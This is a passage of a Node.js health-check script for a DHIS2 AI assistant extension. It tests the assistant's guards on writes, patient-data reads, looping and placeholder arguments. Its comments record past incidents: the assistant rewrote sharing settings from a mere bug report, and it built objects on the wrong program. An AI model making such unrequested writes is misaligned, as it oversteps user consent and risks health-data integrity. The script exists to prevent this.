#!/usr/bin/env node
'use strict';
/* ─────────────────────────────────────────────────────────────────────────────
 * verify.js — dependency-free health check for the DHIS2 AI Assistant worker.
 *
 * Run:  npm run verify   (or:  node scripts/verify.js)
 * Exit: 0 = all good, 1 = something failed.
 *
 * What it does, with ZERO npm dependencies (pure Node + a small chrome shim):
 *   1. Syntax-checks every runtime JavaScript file (`node --check`).
 *   2. Loads the background modules exactly the way the extension does —
 *      concatenated in the importScripts() order declared in background.js, in
 *      one shared global scope — under a minimal `chrome` shim. This proves the
 *      split is internally consistent and that cross-module references resolve
 *      at load time.
 *   3. Exercises the safety-critical PURE functions (write authorization, UID
 *      recognition, patient-data privacy path gate, text normalizers, query
 *      encoding, UID generation) so a future edit can't silently weaken a gate
 *      without turning this check red.
 *
 * This is intentionally NOT a full test framework. It is the smallest thing that
 * makes the refactor safe to build on. See ARCHITECTURE.md → "Verifying changes".
 * ───────────────────────────────────────────────────────────────────────────── */

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { execFileSync } = require('child_process');

const ROOT = path.resolve(__dirname, '..');
let failures = 0;
const ok = (m) => console.log('  \x1b[32m✓\x1b[0m ' + m);
const bad = (m) => { console.log('  \x1b[31m✗\x1b[0m ' + m); failures++; };

// ── 1. Syntax check every runtime JS file ───────────────────────────────────
console.log('\nSyntax check (node --check):');
const runtimeFiles = [
  'background.js', 'content.js', 'generate-icons.js',
  'src/core.js', 'src/memory.js', 'src/registry.js', 'src/providers.js',
  'src/tools-metadata.js', 'src/tools-programs.js', 'src/tools-linelists.js',
  'src/tools-admin.js', 'src/tools-sqlviews.js', 'src/tools-apps.js', 'src/tools-apps-placement.js', 'src/data-check.js', 'src/agent.js',
  'sidepanel/panel.js',
];
for (const rel of runtimeFiles) {
  const abs = path.join(ROOT, rel);
  if (!fs.existsSync(abs)) { bad(`${rel} — missing`); continue; }
  try { execFileSync(process.execPath, ['--check', abs], { stdio: 'pipe' }); ok(rel); }
  catch (e) { bad(`${rel}\n${String(e.stderr || e.message).trim()}`); }
}

// ── 2. Load the background modules under a chrome shim ───────────────────────
console.log('\nModule load (importScripts order, one shared scope):');
const loaderSrc = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');
const modules = [...loaderSrc.matchAll(/'((?:src|libs)\/[^']+\.js)'/g)].map((m) => m[1]);
if (!modules.length) bad('background.js declares no src/*.js modules');

const noop = () => {};
const evt = () => ({ addListener: noop, removeListener: noop, hasListener: () => false });
const store = () => ({ get: () => Promise.resolve({}), set: () => Promise.resolve(), remove: () => Promise.resolve() });
const messageListeners = [];
const chrome = {
  runtime: { id: 'verify', onMessage: { ...evt(), addListener: (f) => messageListeners.push(f) }, onInstalled: evt(), onStartup: evt(),
             getURL: (p) => 'chrome-extension://verify/' + p, getPlatformInfo: (cb) => cb && cb({ os: 'linux' }) },
  storage: { local: store(), session: store(), onChanged: evt() },
  tabs: { onUpdated: evt(), onActivated: evt(), query: () => Promise.resolve([]) },
  action: { onClicked: evt() },
  permissions: { onAdded: evt(), onRemoved: evt(), getAll: () => Promise.resolve({ origins: [] }) },
  scripting: { getRegisteredContentScripts: () => Promise.resolve([]) },
  sidePanel: { setOptions: noop, open: () => Promise.resolve() },
  webNavigation: undefined,
  windows: undefined,
};
const sandbox = {
  chrome, console,
  fetch: () => Promise.reject(new Error('fetch disabled in verify')),
  URL, URLSearchParams, TextEncoder, TextDecoder, FormData, Blob, AbortController, AbortSignal,
  setTimeout, clearTimeout, setInterval, clearInterval, queueMicrotask,
  atob: (s) => Buffer.from(s, 'base64').toString('binary'),
  btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
  crypto: require('crypto').webcrypto,
  structuredClone,
};
sandbox.self = sandbox;
sandbox.globalThis = sandbox;
const ctx = vm.createContext(sandbox);

let loaded = false;
try {
  const bundle = modules
    .map((m) => `\n//# ${m}\n` + fs.readFileSync(path.join(ROOT, m), 'utf8'))
    .join('\n');
  // `dhis2` is a bundle-lexical `let`, so expose a reader for the few checks
  // that need to drive per-turn counters (the loop guards).
  vm.runInContext(bundle + '\n;globalThis.__dhis2 = () => dhis2;'
    + '\n;globalThis.__TOOL_ROUTER = TOOL_ROUTER;'
    + '\n;globalThis.__realSafeDhis2Fetch = safeDhis2Fetch;' // later blocks stub ctx.safeDhis2Fetch
    + '\n;globalThis.__memoryState = () => memoryState; globalThis.__memoryTurn = () => memoryTurn;'
    + '\n;globalThis.WRITE_CAPABLE_TOOL_NAMES = WRITE_CAPABLE_TOOL_NAMES; globalThis.MANUAL_TOOLS = MANUAL_TOOLS; globalThis.TOOL_SUMMARIES = TOOL_SUMMARIES; globalThis.MANUAL_EXTRAS = MANUAL_EXTRAS;',
    ctx, { filename: 'background.bundle.js' });
  loaded = true;
  ok(`loaded ${modules.length} modules: ${modules.map((m) => m.replace('src/', '')).join(', ')}`);
} catch (e) {
  bad(`module load threw: ${(e && e.stack) || e}`);
}

// ── 3. Safety-critical pure-function behaviour ──────────────────────────────
if (loaded) {
  console.log('\nSafety gates & pure helpers:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const truthy = (label, got) => (got ? ok(`${label} => truthy`) : bad(`${label} => ${JSON.stringify(got)} (expected truthy)`));
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing (safety function vanished!)`); return f; };

  // package.json said 2.8.37 while manifest.json said 2.8.38 (found 2026-11-08).
  eq('package.json and manifest.json carry the same version',
    JSON.parse(fs.readFileSync(path.join(ROOT, 'package.json'), 'utf8')).version,
    JSON.parse(fs.readFileSync(path.join(ROOT, 'manifest.json'), 'utf8')).version);

  // write authorization: writes need explicit intent; problem reports do not authorize
  const cwa = need('classifyWriteAuthorization');
  if (cwa) {
    eq("classifyWriteAuthorization('delete the TB program').scope", cwa('delete the TB program').scope, 'broad');
    eq("classifyWriteAuthorization('create a program indicator').scope", cwa('create a program indicator').scope, 'broad');
    eq("classifyWriteAuthorization('yes').scope", cwa('yes').scope, 'broad');
    eq("classifyWriteAuthorization('why is saving failing?').scope", cwa('why is saving failing?').scope, 'read_only');
    eq("classifyWriteAuthorization('diagnose the enrollment issue').scope", cwa('diagnose the enrollment issue').scope, 'read_only');
  }

  // DHIS2 UID recognition — entropy gate rejects English-word-shaped tokens
  const uid = need('isLikelyDhisUid');
  if (uid) {
    eq("isLikelyDhisUid('a3kGcGpz8FJ')", uid('a3kGcGpz8FJ'), true);
    eq("isLikelyDhisUid('XGcG2PFIvOU')", uid('XGcG2PFIvOU'), true);
    eq("isLikelyDhisUid('Respiratory')", uid('Respiratory'), false);
    eq("isLikelyDhisUid('short')", uid('short'), false);
  }
  const shape = need('hasUidShape');
  if (shape) { eq("hasUidShape('a3kGcGpz8FJ')", shape('a3kGcGpz8FJ'), true); eq("hasUidShape('nope')", shape('nope'), false); }

  // generated UIDs must satisfy the DHIS2 UID shape
  const gen = need('generateDhis2Uid');
  if (gen) { const u = gen(); truthy(`generateDhis2Uid() = ${JSON.stringify(u)} matches /^[A-Za-z][A-Za-z0-9]{10}$/`, /^[A-Za-z][A-Za-z0-9]{10}$/.test(u)); }

  // patient-data privacy path gate (row-level tracker/analytics blocked, aggregate/metadata allowed)
  const priv = need('pathReadsPatientData');
  if (priv) {
    eq("pathReadsPatientData('tracker/events')", priv('tracker/events'), true);
    eq("pathReadsPatientData('tracker/trackedEntities.json')", priv('tracker/trackedEntities.json'), true);
    eq("pathReadsPatientData('analytics/events/query/PROG')", priv('analytics/events/query/PROG'), true);
    eq("pathReadsPatientData('trackedEntityInstances.csv')", priv('trackedEntityInstances.csv'), true);
    eq("pathReadsPatientData('analytics/events/aggregate/PROG')", priv('analytics/events/aggregate/PROG'), false);
    eq("pathReadsPatientData('programs?fields=id')", priv('programs?fields=id'), false);
  }

  // the two normalizers that used to collide under one name
  const lc = need('lowercaseText'), ns = need('normalizeSearchTokens');
  if (lc) eq("lowercaseText('Sub-County')", lc('Sub-County'), 'sub-county');
  if (ns) eq("normalizeSearchTokens('Sub-County!')", ns('Sub-County!'), 'sub county');
  eq('normalizeText is gone (dedup regression guard)', typeof ctx.normalizeText, 'undefined');

  // the descendant trigger the dedup bug had silently disabled
  const desc = need('userExplicitlyWantsDescendants');
  if (desc) {
    eq("userExplicitlyWantsDescendants('counts for all sub-counties')", desc('counts for all sub-counties'), true);
    eq("userExplicitlyWantsDescendants('this facility only')", desc('this facility only'), false);
  }

  // strict query encoding (self-hosted Tomcat 400s on raw brackets)
  const enc = need('encodeStrictQueryChars');
  if (enc) eq("encodeStrictQueryChars('filter=a[b]')", enc('filter=a[b]'), 'filter=a%5Bb%5D');

  // line-listing router returns a block-id array
  const route = need('routeLineListingBlocks');
  if (route) truthy("routeLineListingBlocks('show me a line list') is an array", Array.isArray(route('show me a line list')));

  // no-progress guard: identical EXECUTED calls are refused once the model is
  // clearly looping — the defect that let manage_dashboards(list) run 45× and
  // burn the whole iteration budget (2026-07-13). Guards run over a fresh
  // per-turn state (executedCallSigs is created lazily on first note).
  const noteExec = need('noteExecutedCall');
  const noProg = need('noProgressStopOrNull');
  const preflight = need('preflightCheckCall');
  if (noteExec && noProg && preflight) {
    const loopArgs = { action: 'list' };
    eq('noProgressStopOrNull before any run => null', noProg('manage_dashboards', loopArgs), null);
    eq('1st identical execution count', noteExec('manage_dashboards', loopArgs), 1);
    eq('2nd identical execution count', noteExec('manage_dashboards', loopArgs), 2);
    eq('noProgress after 2 runs (still under limit) => null', noProg('manage_dashboards', loopArgs), null);
    eq('3rd identical execution count', noteExec('manage_dashboards', loopArgs), 3);
    const stop = noProg('manage_dashboards', loopArgs);
    eq('noProgress after 3 identical runs → blocked scope', stop && stop._scope, 'no_progress_repeat');
    // key ordering must not matter (stable signature)
    truthy('preflightCheckCall refuses the looping call (any key order)',
      preflight('manage_dashboards', { action: 'list' }) &&
      preflight('manage_dashboards', { action: 'list' })._scope === 'no_progress_repeat');
    // a DIFFERENT call is unaffected — no false positive on genuine progress
    eq('different args are NOT blocked', noProg('manage_dashboards', { action: 'get', id: 'abc' }), null);
    eq('a different tool is NOT blocked', noProg('search_metadata', { object_type: 'programs' }), null);
  }

  // Fix A — a dashboard-app request to "create an indicator" for a tracker
  // enrollment metric must surface manage_program_indicators (the AGGREGATE
  // manage_indicators tool cannot count enrollments by a tracked-entity attr).
  const getTools = need('getContextualTools');
  if (getTools) {
    // The EXACT message from the 2026-07-13 report, typos and all ("incdicator",
    // "dahboard", "visulization") — those typos defeated every indicator/
    // dashboard keyword, so the fix must not depend on spelling. On the
    // Dashboard app the chart-metric tools must be present regardless.
    const req = 'remove this visulization Monthly Screening Trends by Method from the dahboard and replace it with a visulization that show percentge of male vs females that are enrolled in the program, note that you likely need to create an incdicator for this to work';
    let names = [];
    try { names = getTools({ appType: 'Dashboard' }, req, false, null).map((t) => t.function.name); }
    catch (e) { bad(`getContextualTools threw: ${e && e.message}`); }
    truthy('Dashboard app surfaces manage_program_indicators (typo-proof)', names.includes('manage_program_indicators'));
    truthy('Dashboard app surfaces manage_indicators', names.includes('manage_indicators'));
    truthy('Dashboard app surfaces get_program_info', names.includes('get_program_info'));
    truthy('Dashboard app still surfaces manage_dashboards', names.includes('manage_dashboards'));

    // Fix D — get_program_info must accept program_id / program_name so it works
    // from a page with no program in context (it dead-ended on "No program in
    // context" in the 2026-07-13 report even though the model knew the UID).
    const defs = getTools({ appType: 'Dashboard' }, req, false, null);
    const gpi = defs.find((t) => t.function.name === 'get_program_info');
    const props = (gpi && gpi.function.parameters && gpi.function.parameters.properties) || {};
    truthy('get_program_info schema exposes program_id', !!props.program_id);
    truthy('get_program_info schema exposes program_name', !!props.program_name);

    // Batch program-indicator create (v2.8.18) — the schema must expose an
    // `indicators` array so a big analytics build commits many PIs in ONE call
    // instead of one-per-loop-iteration (the 47-PI pregnancy disaster). The tool
    // description must steer toward the batch + single-PI percentage pattern.
    const mpi = defs.find((t) => t.function.name === 'manage_program_indicators');
    const mpiProps = (mpi && mpi.function.parameters && mpi.function.parameters.properties) || {};
    truthy('manage_program_indicators schema exposes indicators[] (batch)', !!(mpiProps.indicators && mpiProps.indicators.type === 'array'));
    truthy('manage_program_indicators still exposes single indicator', !!mpiProps.indicator);
    truthy('manage_program_indicators description teaches batch', /BATCH/.test(mpi.function.description || ''));
    truthy('manage_program_indicators description teaches single-PI % (AVERAGE)', /AVERAGE/.test(mpi.function.description || '') && /d2:condition/.test(mpi.function.description || ''));

    // A MAP is refused as a visualization type, and the refusal must point at
    // manage_maps + the { type:"MAP", map_id } dashboard tile (2026-07-19: kimi
    // tried to inline a map as new_visualization and needed the recovery hint).
    const buildViz = fn('buildVisualizationObject');
    if (buildViz) {
      const mapRefusal = buildViz({ name: 'X', vis_type: 'MAP', data_items: ['abcdef12345'], periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] }, {});
      truthy('vis_type MAP is refused', !!(mapRefusal && mapRefusal._error));
      truthy('vis_type MAP refusal hints manage_maps', !!(mapRefusal && /manage_maps/.test(mapRefusal._hint || '')));
    } else {
      bad('buildVisualizationObject — missing (cannot verify MAP refusal hint)');
    }
  }

  // Named-program substitution guard — a user-named program that searches
  // proved absent must BLOCK program-bound writes against a lookalike program
  // (the 2026-07-19 incident: line lists silently built on the MCH program
  // when "Integrated Pregnancy, Delivery and Postnatal Care Tracker" did not
  // exist). Async check runs against a pre-seeded name cache — no network.
  // The `dhis2` state object lives in the bundle's lexical scope (a top-level
  // `let`), so it is NOT reachable as a context property — the guard is
  // therefore exercised purely through its own functions, which read/write
  // that state. safeDhis2Fetch is stubbed so program-name resolution needs no
  // network; overriding the context property redirects the internal call.
  const noteMissing = need('noteMissingNamedTarget');
  const clearFound = need('clearNamedTargetsFoundIn');
  const subStop = need('namedProgramSubstitutionStop');
  if (noteMissing && clearFound && subStop) {
    const NAMES = {
      hwuYFxYpWyK: 'Maternal and Child Health (MCH) Program',
      aBcDeFgHiJ2: 'Integrated Pregnancy, Delivery and Postnatal Care Tracker',
    };
    ctx.safeDhis2Fetch = async (p) => {
      const m = String(p).match(/programs\/([A-Za-z][A-Za-z0-9]{10})/);
      const id = m && m[1];
      return id && NAMES[id] ? { id, displayName: NAMES[id] } : { _error: 'not found' };
    };
    (async () => {
      // Generic / wrong-type searches must NOT arm the guard: a lookalike write
      // stays allowed (subStop returns null when nothing is armed).
      noteMissing('programs', 'ANC');                     // 1 word, <10 chars
      noteMissing('dataElements', 'Integrated Pregnancy'); // wrong object type
      eq('generic/wrong-type searches leave lookalike writes allowed',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);

      // A specific failed program search arms the guard → lookalike write blocked.
      noteMissing('programs', 'Integrated Pregnancy');
      const blocked = await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK');
      truthy('write on a lookalike program is BLOCKED',
        blocked && blocked._scope === 'named_program_substitution_blocked');

      // A write on a program whose name matches the missing one passes AND
      // disarms — so the "create the missing program, then build on it" flow
      // is never blocked. Prove disarm: the lookalike write is allowed after.
      eq('write on a program matching the missing name passes',
        await subStop('manage_line_lists', 'create', 'aBcDeFgHiJ2'), null);
      eq('matching write disarmed the guard (lookalike now allowed)',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);

      // Finding the program later under a variant spelling also disarms it.
      noteMissing('programs', 'Integrated Pregnancy');
      clearFound(['Integrated Pregnancy, Delivery and Postnatal Care Tracker']);
      eq('a found program name containing the query disarms the guard',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);
    })().catch((e) => bad(`namedProgramSubstitutionStop threw: ${e && e.message}`));
  }

  // Broken-tile fix — a TRACKER-domain data element is not a valid aggregate dx
  // item; buildVisualizationObject must refuse it (the 3-of-5-tiles-broken
  // report) with a program-indicator pointer, while still building normal PIs.
  const buildViz = need('buildVisualizationObject');
  if (buildViz) {
    const base = { name: 'T', vis_type: 'PIE', periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] };
    const trk = buildViz({ ...base, data_items: ['NfmqhsFpwnv'] }, { NfmqhsFpwnv: 'TRACKER_DATA_ELEMENT' });
    truthy('tracker data element is REFUSED as a viz data_item', trk && !!trk._error && trk._tracker_data_element === 'NfmqhsFpwnv');
    const pi = buildViz({ ...base, data_items: ['G2ON5cPuXxf'] }, { G2ON5cPuXxf: 'PROGRAM_INDICATOR' });
    truthy('program indicator still builds a valid visualization', pi && !pi._error && !!pi.viz);
  }

  // The discovery-streak guard must not fire on a READ-ONLY turn: verifying or
  // diagnosing is legitimately all reads, and there is no write to redirect to.
  console.log('\nDiscovery-streak guard respects read-only turns:');
  const discoStop = need('discoveryStreakStopOrNull');
  const cwa2 = fn('classifyWriteAuthorization');
  const D3 = typeof ctx.__dhis2 === 'function' ? ctx.__dhis2() : null;
  if (discoStop && cwa2 && D3) {
    // The agentic loop ASSIGNS the classification onto dhis2.writeAuth; mirror
    // that here so the guard sees the same state it does at runtime.
    D3.consecutiveDiscoveryCalls = 40;                    // a long streak, under the read-only bound
    D3.writeAuth = cwa2('check that the dashboard renders correctly'); // read_only
    eq('a long read-only streak (40) is NOT blocked — verifying is all reads', discoStop('get_program_info', {}), null);
    D3.consecutiveDiscoveryCalls = 99;                    // past READ_ONLY_DISCOVERY_LIMIT
    truthy('…past 60 reads a read-only turn is told to answer from what it found (never to write)', /enough to answer/.test((discoStop('get_program_info', {}) || {})._error || '') && !/Issue the actual write/.test((discoStop('get_program_info', {}) || {})._hint || ''));
    D3.consecutiveDiscoveryCalls = 99;
    D3.writeAuth = cwa2('create a tracker program for TB');            // broad
    eq('…but a write turn still enforces the streak limit',
      (discoStop('get_program_info', {}) || {})._scope, 'no_progress_repeat');
    D3.consecutiveDiscoveryCalls = 0;
    eq('…and a short streak is fine either way', discoStop('get_program_info', {}), null);
    D3.writeAuth = null;
  }

  // ── Placeholder-argument guard ───────────────────────────────────────────────
  // A model that issues two DEPENDENT tool calls in ONE message bridges the gap
  // with an invented token ("__LINE_LIST_ID__", live 2026-07-24). The guard must
  // catch the placeholder BEFORE execution, explain the sequencing cause, stay
  // non-disabling for the first attempts, then escalate so the loop terminates.
    console.log('\nPlaceholder-argument guard:');
    const findPh = need('findPlaceholderArgs');
    const phStop = need('placeholderArgStopOrNull');
    const D = ctx.dhis2;
    if (findPh) {
      const hit = (v) => [...findPh(v)];
      eq('__LINE_LIST_ID__ is a placeholder', hit('__LINE_LIST_ID__').length, 1);
      eq('<viz_id> is a placeholder', hit('<viz_id>').length, 1);
      eq('{{dashboardId}} is a placeholder', hit('{{dashboardId}}').length, 1);
      eq('YOUR_PROGRAM_ID is a placeholder', hit('YOUR_PROGRAM_ID').length, 1);
      eq('PROGRAM_ID_HERE is a placeholder', hit('PROGRAM_ID_HERE').length, 1);
      eq('xxxxxxxxxxx is a placeholder', hit('xxxxxxxxxxx').length, 1);
      eq('found nested inside items[]',
        hit({ items: [{ event_visualization_id: '__LINE_LIST_ID__' }] }).length, 1);
      // Must NOT fire on legitimate arguments.
      eq('a real UID is not a placeholder', hit('Rjl6TGHbLL0').length, 0);
      eq('a display name is not a placeholder', hit('VPD - Suspected cases').length, 0);
      eq('a PI expression is not a placeholder',
        hit('d2:condition("#{a.b} != \'\'", 100, 0)').length, 0);
      eq('a fields query is not a placeholder', hit('programs/Rjl6TGHbLL0?fields=id,displayName').length, 0);
      eq('prose with <brackets> mid-sentence is not a placeholder',
        hit('the value <must be> resolved before saving it to the server').length, 0);
    }
    if (phStop) {
    // `dhis2` is a bundle-lexical `let`, so the per-tool counter cannot be
    // reset from here — each assertion uses its OWN tool name instead.
    eq('a clean call is not blocked',
      phStop('manage_dashboards', { dashboard: { name: 'VPD' } }), null);
    const first = phStop('manage_maps', { items: [{ event_visualization_id: '__LINE_LIST_ID__' }] });
    truthy('a placeholder call IS blocked', !!first && !!first._error);
    eq('first block is non-disabling', first && first._no_disable, true);
    eq('first block scope', first && first._scope, 'placeholder_argument');
    truthy('hint explains same-message sequencing',
      /SAME message/i.test((first && first._hint) || ''));
    truthy('the offending token is reported back',
      Array.isArray(first && first._placeholders) && first._placeholders.includes('__LINE_LIST_ID__'));
    // 3 placeholder blocks on ONE tool escalate to the circuit-breaker scope so
    // a model that ignores the guidance still terminates the turn.
    phStop('manage_legend_sets', { a: '__X_ID__' });
    phStop('manage_legend_sets', { a: '<viz_id>' });
    const third = phStop('manage_legend_sets', { a: '{{id}}' });
    eq('3rd block escalates to the circuit-breaker scope', third && third._scope, 'no_progress_repeat');
    eq('3rd block is no longer non-disabling', third && third._no_disable, undefined);
    const preflight = need('preflightCheckCall');
    if (preflight) {
      const pf = preflight('manage_option_sets', { items: [{ visualization_id: '<viz_id>' }] });
      truthy('preflightCheckCall refuses placeholder args ahead of the other guards',
        !!pf && pf._scope === 'placeholder_argument');
    }
  }

  // ── A{…}/#{…} in a PI must be UIDs, never display names ───────────────────
  // DHIS2's /description validator returns status OK for a display name, so the
  // indicator SAVES and only detonates at dashboard render time with HTTP 500
  // 'ctx.uid0 is null' (live 2026-07-25: A{Clinical diagnosis} == 'MEASLES').
  console.log('\nProgram-indicator reference linting:');
  const lintPi = need('lintProgramIndicatorExpression');
  if (lintPi) {
    const bad = lintPi("A{Clinical diagnosis} == 'MEASLES'", 'filter');
    truthy('a display name inside A{} is rejected', !!(bad && bad.error));
    truthy('…and the hint explains the silent-save trap',
      /ctx\.uid0|returns status OK/i.test((bad && bad.hint) || ''));
    truthy('…and it distinguishes PIs from program RULES',
      /program RULES/i.test((bad && bad.hint) || ''));
    truthy('a display name inside #{} is rejected',
      !!(lintPi("#{Final case classification} == 'X'", 'filter') || {}).error);
    truthy('an empty A{} is rejected', !!(lintPi("A{} == 'X'", 'filter') || {}).error);

    // Valid forms must pass untouched.
    eq('A{teaUid} is accepted', lintPi("A{eQuMRwqS6tp} == 'MEASLES'", 'filter'), null);
    eq('#{stageUid.deUid} is accepted', lintPi("#{cJN4ThUYVSG.BsJMZaW74r6} == 'X'", 'filter'), null);
    eq('a bare #{deUid} is accepted', lintPi('#{BsJMZaW74r6} > 5', 'filter'), null);
    eq('the combined real-world filter is accepted',
      lintPi("A{eQuMRwqS6tp} == 'MEASLES' && #{cJN4ThUYVSG.BsJMZaW74r6} == 'LABORATORY_CONFIRMED'", 'filter'), null);
    eq('V{} and d2: expressions are untouched',
      lintPi('d2:condition("#{cJN4ThUYVSG.BsJMZaW74r6} == \'X\'", 100, 0)', 'expression'), null);
    eq('V{enrollment_count} is accepted', lintPi('V{enrollment_count}', 'expression'), null);
  }

  // ── PI validation: a server fault is not a rejection ──────────────────────
  // /programIndicators/{expression|filter}/description is an ADVISORY pre-check;
  // the authoritative gate is the VALIDATE→COMMIT import. One transient 500
  // aborted a whole 4-indicator batch ("All 4 failed validation — nothing was
  // created", live 2026-07-25). 5xx/network must be INCONCLUSIVE, never invalid.
  console.log('\nProgram-indicator validation resilience:');
  const inconclusive = need('piValidationInconclusive');
  if (inconclusive) {
    eq('a 500 from the validator is inconclusive',
      inconclusive({ _error: 'HTTP 500', _status: 500 }), true);
    eq('a 503 is inconclusive', inconclusive({ _error: 'HTTP 503', _status: 503 }), true);
    eq('a network failure is inconclusive',
      inconclusive({ _error: 'Validation fetch failed: network error' }), true);
    // Semantic rejections must still fail fast — otherwise bad expressions ship.
    eq('a 200+ERROR semantic rejection is NOT inconclusive',
      inconclusive({ status: 'ERROR', message: 'Expression is not valid' }), false);
    eq('a 409 semantic rejection is NOT inconclusive',
      inconclusive({ _error: 'HTTP 409: bad expression', _status: 409 }), false);
    eq('a 400 is NOT inconclusive', inconclusive({ _error: 'HTTP 400', _status: 400 }), false);
    eq('a clean result is NOT inconclusive', inconclusive({ status: 'OK' }), false);
    eq('null is NOT inconclusive', inconclusive(null), false);
  }

  // ── dx: on an event/enrollment analytics endpoint ─────────────────────────
  // Always a 409 whose message names an internal SQL column ("column ax.dx does
  // not exist"), so the model rewrites everything except the actual fault.
  // Verified live on 2.42.5.1: bare-UID works, dx: does not.
  console.log('\nAnalytics dx: dimension healing:');
  const healDx = need('healEventAnalyticsDxDimension');
  if (healDx) {
    eq('dx: is stripped on an enrollment analytics query',
      healDx('analytics/enrollments/aggregate/L1cyxFooXfL?dimension=dx:ywZ8uDLGNba&dimension=pe:LAST_12_MONTHS').path,
      'analytics/enrollments/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba&dimension=pe:LAST_12_MONTHS');
    eq('…and on an event analytics query',
      healDx('analytics/events/aggregate/L1cyxFooXfL?dimension=dx:ywZ8uDLGNba').path,
      'analytics/events/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba');
    eq('the URL-encoded form is healed too',
      healDx('analytics/events/aggregate/L1cyxFooXfL?dimension=dx%3AywZ8uDLGNba').path,
      'analytics/events/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba');
    eq('pe:/ou: dimensions are untouched',
      healDx('analytics/events/aggregate/P?dimension=pe:THIS_YEAR&dimension=ou:USER_ORGUNIT').healed, false);
    // The AGGREGATE endpoint genuinely uses dx: — it must never be rewritten.
    eq('the aggregate /analytics endpoint keeps dx:',
      healDx('analytics.json?dimension=dx:ywZ8uDLGNba&dimension=pe:THIS_YEAR').healed, false);
    eq('a bare /analytics query keeps dx:',
      healDx('analytics?dimension=dx:ywZ8uDLGNba').healed, false);
    eq('a path with no query string is left alone',
      healDx('analytics/events/aggregate/L1cyxFooXfL').healed, false);
  }
  // The event/enrollment analytics resources are PLURAL; the singular 404s.
  const healPlural = need('healAnalyticsResourcePlural');
  if (healPlural) {
    eq('analytics/enrollment/ → analytics/enrollments/',
      healPlural('analytics/enrollment/query/aaaaaaaaaa1?dimension=ou:USER_ORGUNIT').path,
      'analytics/enrollments/query/aaaaaaaaaa1?dimension=ou:USER_ORGUNIT');
    eq('analytics/event/ → analytics/events/',
      healPlural('analytics/event/aggregate/aaaaaaaaaa1').path, 'analytics/events/aggregate/aaaaaaaaaa1');
    eq('the plural form is untouched',
      healPlural('analytics/enrollments/query/aaaaaaaaaa1').healed, false);
    eq('the aggregate endpoint is untouched', healPlural('analytics?dimension=dx:a1').healed, false);
  }
  // Packing several dimensions into ONE dimension= parameter → DHIS2 reports the
  // later ones as missing ("A end date was not specified in periods…").
  const healPack = need('healPackedAnalyticsDimensions');
  if (healPack) {
    eq('packed dx;pe;ou is split into three dimensions',
      healPack('analytics?dimension=dx:aaaaaaaaaa1;pe:LAST_12_MONTHS;ou:LEVEL-4&outputIdScheme=NAME').path,
      'analytics?dimension=dx:aaaaaaaaaa1&dimension=pe:LAST_12_MONTHS&dimension=ou:LEVEL-4&outputIdScheme=NAME');
    eq('bare items stay attached to their own dimension',
      healPack('analytics?dimension=dx:a1;pe:THIS_YEAR;ou:LEVEL-4;bbbbbbbbbb2').path,
      'analytics?dimension=dx:a1&dimension=pe:THIS_YEAR&dimension=ou:LEVEL-4;bbbbbbbbbb2');
    eq('multi-item dx is preserved as ONE dimension',
      healPack('analytics?dimension=dx:a1;b2&dimension=pe:THIS_YEAR').healed, false);
    eq('already-separate dimensions are untouched',
      healPack('analytics?dimension=dx:a1&dimension=pe:THIS_YEAR&dimension=ou:LEVEL-4').healed, false);
    eq('filter= is split the same way',
      healPack('analytics?dimension=dx:a1&filter=pe:THIS_YEAR;ou:LEVEL-4').path,
      'analytics?dimension=dx:a1&filter=pe:THIS_YEAR&filter=ou:LEVEL-4');
    eq('a non-analytics path is untouched',
      healPack('programs/aaaaaaaaaa1?fields=id;name').healed, false);
  }
  // Repeating dimension=dx: → 409 "Dimensions cannot be specified more than
  // once: [dx]". Both items belong in ONE semicolon-separated dx dimension.
  const healDup = need('healDuplicateDxDimension');
  if (healDup) {
    eq('two dx dimensions are merged into one',
      healDup('analytics?dimension=dx:aaaaaaaaaa1&dimension=dx:bbbbbbbbbb2&dimension=pe:THIS_YEAR').path,
      'analytics?dimension=dx:aaaaaaaaaa1;bbbbbbbbbb2&dimension=pe:THIS_YEAR');
    eq('order of the surviving dimensions is preserved',
      healDup('analytics?dimension=pe:THIS_YEAR&dimension=dx:a1&dimension=ou:LEVEL-2&dimension=dx:b2').path,
      'analytics?dimension=pe:THIS_YEAR&dimension=dx:a1;b2&dimension=ou:LEVEL-2');
    eq('a single dx dimension is untouched',
      healDup('analytics?dimension=dx:aaaaaaaaaa1&dimension=pe:THIS_YEAR').healed, false);
    eq('an already-merged dx is untouched',
      healDup('analytics?dimension=dx:a1;b2&dimension=pe:THIS_YEAR').healed, false);
    eq('duplicate items are de-duplicated',
      healDup('analytics?dimension=dx:a1&dimension=dx:a1').path, 'analytics?dimension=dx:a1');
    eq('no query string is left alone', healDup('analytics').healed, false);
  }

  // ── Write authorization: an INABILITY report is not consent ────────────────
  // "something is wrong … it's not allowing me to add new enrollment" was
  // classified `broad` because the word "add" appears in it — so a pure bug
  // report authorized writes, and the assistant rewrote sharing on 4 stages and
  // 15 attributes on an unverified theory (live 2026-07-25). A write verb
  // inside an inability clause is the thing that FAILED, never an instruction.
  console.log('\nWrite authorization — inability reports must stay read-only:');
  if (cwa) {
    const scope = (t) => cwa(t).scope;
    // The exact messages from the incident.
    eq('"…not allowing me to add new enrollemtn" (verbatim, incl. typos)',
      scope("somthing is wrong, it must be realted to sharing or OU, check as its not allowing me to add new enrollemtn"),
      'read_only');
    // Every common phrasing of the same complaint.
    for (const t of [
      "I can't add a new enrollment",
      "it won't let me create an event",
      "the system is not allowing me to delete this",
      "unable to update the program",
      "why can't I add a data element?",
      "the form doesn't let me save or add anything",
